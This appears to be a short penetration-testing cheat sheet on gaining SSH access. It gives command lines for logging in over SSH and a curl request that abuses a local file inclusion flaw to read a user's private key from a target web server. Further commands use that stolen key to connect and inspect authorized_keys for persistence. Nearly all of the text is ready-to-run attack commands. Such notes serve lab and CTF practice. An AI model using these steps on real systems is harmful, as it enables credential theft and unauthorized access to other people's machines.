- `you can’t get initial access directly however we can login with user and password and private key`

### Login with username & password (if known):

```bash
ssh <USER>@<ip>
ssh -p 2222 <USER>@<ip>     # Custom SSH port
```
### Leak private key via LFI or web access:

```bash
curl http://<ip>/index.php?page=../../../../home/<USER>/.ssh/id_rsa
```
### Set permissions & connect with private key:

```bash
chmod 600 id_rsa
ssh -i id_rsa -p 2222 <USER>@<ip>
```
### Look for authorized keys (for persistence or recon):

```bash
~/.ssh/authorized_keys
```
